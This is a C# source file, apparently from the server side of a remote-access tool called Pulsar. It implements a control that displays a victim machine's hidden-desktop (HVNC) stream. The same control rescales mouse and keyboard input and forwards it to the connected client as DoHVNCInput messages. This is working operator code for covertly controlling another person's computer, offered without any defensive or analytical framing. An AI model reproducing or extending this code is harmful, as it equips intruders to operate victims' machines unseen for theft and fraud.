﻿using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Controls
{
    public interface IHVNCRapidPictureBox
    {
        bool Running { get; set; }
        Image GetImageSafe { get; set; }

        void Start();
        void Stop();
        void UpdateImage(Bitmap bmp, bool cloneBitmap = false);
    }

    /// <summary>
    /// Custom PictureBox Control designed for rapidly-changing images.
    /// </summary>
    public class HVNCRapidPictureBox : PictureBox, IRapidPictureBox
    {
        /// <summary>
        /// True if the PictureBox is currently streaming images, else False.
        /// </summary>
        public bool Running { get; set; }

        /// <summary>
        /// Returns the width of the original screen.
        /// </summary>
        public int ScreenWidth { get; private set; }

        /// <summary>
        /// Returns the height of the original screen.
        /// </summary>
        public int ScreenHeight { get; private set; }

        /// <summary>
        /// Provides thread-safe access to the Image of this Picturebox.
        /// </summary>
        public Image GetImageSafe
        {
            get
            {
                return Image;
            }
            set
            {
                lock (_imageLock)
                {
                    Image = value;
                }
            }
        }

        /// <summary>
        /// The lock object for the Picturebox's image.
        /// </summary>
        private readonly object _imageLock = new object();

        /// <summary>
        /// The Stopwatch for internal FPS measuring.
        /// </summary>
        private Stopwatch _sWatch;

        /// <summary>
        /// The internal class for FPS measuring.
        /// </summary>
        private FrameCounter _frameCounter;

        [DllImport("user32.dll")]
        static extern short VkKeyScan(char c);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        // Constants for clipboard data formats
        public const uint CF_TEXT = 1;          // Text format
        public const uint CF_BITMAP = 2;        // Bitmap format
        public const uint CF_UNICODETEXT = 13;   // Unicode text format
        public const uint CF_HDROP = 15;         // File format

        Client client = null;

        /// <summary>
        /// Subscribes an Eventhandler to the FrameUpdated event.
        /// </summary>
        /// <param name="e">The Eventhandler to set.</param>
        public void SetFrameUpdatedEvent(FrameUpdatedEventHandler e)
        {
            _frameCounter.FrameUpdated += e;
        }

        /// <summary>
        /// Unsubscribes an Eventhandler from the FrameUpdated event.
        /// </summary>
        /// <param name="e">The Eventhandler to remove.</param>
        public void UnsetFrameUpdatedEvent(FrameUpdatedEventHandler e)
        {
            _frameCounter.FrameUpdated -= e;
        }

        /// <summary>
        /// Starts the internal FPS measuring.
        /// </summary>
        public void Start()
        {
            _frameCounter = new FrameCounter();

            _sWatch = Stopwatch.StartNew();

            Running = true;
        }

        public void addClient(Client client)
        {
            this.client = client;
        }

        /// <summary>
        /// Stops the internal FPS measuring.
        /// </summary>
        public void Stop()
        {
            _sWatch?.Stop();

            Running = false;
        }

        /// <summary>
        /// Updates the Image of this Picturebox.
        /// </summary>
        /// <param name="bmp">The new bitmap to use.</param>
        /// <param name="cloneBitmap">If True the bitmap will be cloned, else it uses the original bitmap.</param>
        public void UpdateImage(Bitmap bmp, bool cloneBitmap)
        {
            try
            {
                CountFps();

                if ((ScreenWidth != bmp.Width) && (ScreenHeight != bmp.Height))
                    UpdateScreenSize(bmp.Width, bmp.Height);

                lock (_imageLock)
                {
                    // get old image to dispose it correctly
                    var oldImage = GetImageSafe;

                    SuspendLayout();
                    GetImageSafe = cloneBitmap ? new Bitmap(bmp, Width, Height) /*resize bitmap*/ : bmp;
                    ResumeLayout();

                    oldImage?.Dispose();
                }
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Constructor, sets Picturebox double-buffered and initializes the Framecounter.
        /// </summary>
        public HVNCRapidPictureBox()
        {
            this.SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x02000000;  // Turn on WS_EX_COMPOSITED
                return cp;
            }
        }

        protected override void OnPaint(PaintEventArgs pe)
        {
            lock (_imageLock)
            {
                if (GetImageSafe != null)
                {
                    pe.Graphics.DrawImage(GetImageSafe, Location);
                }
            }
        }

        private void UpdateScreenSize(int newWidth, int newHeight)
        {
            ScreenWidth = newWidth;
            ScreenHeight = newHeight;
        }

        private void CountFps()
        {
            var deltaTime = (float)_sWatch.Elapsed.TotalSeconds;
            _sWatch = Stopwatch.StartNew();

            _frameCounter.Update(deltaTime);
        }

        [DllImport("user32.dll")]
        public static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, out uint lpChar, uint uFlags);

        private Point TranslateCoordinates(Point originalCoords, PictureBox pictureBox)
        {
            if (pictureBox.Image == null)
                return originalCoords;

            Rectangle clientRect = pictureBox.ClientRectangle;

            Size resolution = HVNCHandler.resolution;

            float scaleX = (float)resolution.Width / clientRect.Width;
            float scaleY = (float)resolution.Height / clientRect.Height;

            int remoteX = (int)(originalCoords.X * scaleX);
            int remoteY = (int)(originalCoords.Y * scaleY);

            return new Point(remoteX, remoteY);
        }

        public static bool IsAlphaNumeric(char c)
        {
            return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '1' && c <= '9');
        }

        public static char GetModifiedKey(char c)
        {
            short vkKeyScanResult = VkKeyScan(c);

            // a result of -1 indicates no key translates to input character
            if (vkKeyScanResult == -1)
                return c;

            // vkKeyScanResult & 0xff is the base key, without any modifiers
            uint code = (uint)vkKeyScanResult & 0xff;
            // set shift key pressed
            byte[] b = new byte[256];
            b[0x10] = 0x80;

            uint r;
            // return value of 1 expected (1 character copied to r)
            if (1 != ToAscii(code, code, b, out r, 0))
                return c;

            return (char)r;
        }

        protected override void WndProc(ref Message m)
        {
            if (this.Image == null)
            {
                base.WndProc(ref m);
                return;
            }

            switch (m.Msg)
            {
                case 0x0201: // WM_LBUTTONDOWN
                case 0x0202: // WM_LBUTTONUP
                case 0x0204: // WM_RBUTTONDOWN
                case 0x0205: // WM_RBUTTONUP
                case 0x0207: // WM_MBUTTONDOWN
                case 0x0208: // WM_MBUTTONUP
                case 0x0203: // WM_LBUTTONDBLCLK
                case 0x0206: // WM_RBUTTONDBLCLK
                case 0x0209: // WM_MBUTTONDBLCLK
                case 0x0200: // WM_MOUSEMOVE
                case 0x020A: // WM_MOUSEWHEEL
                    short delta = (short)((m.WParam.ToInt64() >> 16) & 0xFFFF);

                    int x = (int)(m.LParam.ToInt64() & 0xFFFF);
                    int y = (int)((m.LParam.ToInt64() >> 16) & 0xFFFF);

                    Point newpoint = TranslateCoordinates(new Point(x, y), this);

                    m.LParam = (IntPtr)((newpoint.Y << 16) | (newpoint.X & 0xFFFF));

                    uint msg = (uint)m.Msg;
                    IntPtr wParam = m.WParam;
                    IntPtr lParam = m.LParam;
                    long Imsg = (long)msg;
                    long IwParam = wParam.ToInt64();
                    long IlParam = lParam.ToInt64();

                    Task.Run(() =>
                    {
                        client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                    }).Wait();
                    break;

                case 0x0302:
                    break;

                case 0x0100:
                case 0x0101:
                    msg = (uint)m.Msg;
                    wParam = m.WParam;
                    lParam = m.LParam;

                    bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                    bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                    if (isShiftPressed || isCapsLockOn)
                    {
                        const int VK_SHIFT = 0x10;
                        const int VK_CAPITAL = 0x14;

                        if (wParam.ToInt32() == VK_SHIFT || wParam.ToInt32() == VK_CAPITAL)
                        {
                            break;
                        }

                        if (isShiftPressed)
                        {
                            msg = 0x0102;
                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
                            wParam = (IntPtr)Convert.ToInt32(GetModifiedKey((char)charCode));
                        }

                        if (isCapsLockOn)
                        {
                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
                            if (IsAlphaNumeric((char)charCode))
                            {
                                msg = 0x0102;
                            }
                        }
                    }
                    try
                    {
                        Imsg = (long)msg;
                        IwParam = wParam.ToInt64();
                        IlParam = lParam.ToInt64();
                        Task.Run(() =>
                        {
                            client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                        }).Wait();
                        break;
                    }
                    catch
                    {
                        break;
                    }
            }
            base.WndProc(ref m);
        }
    }
}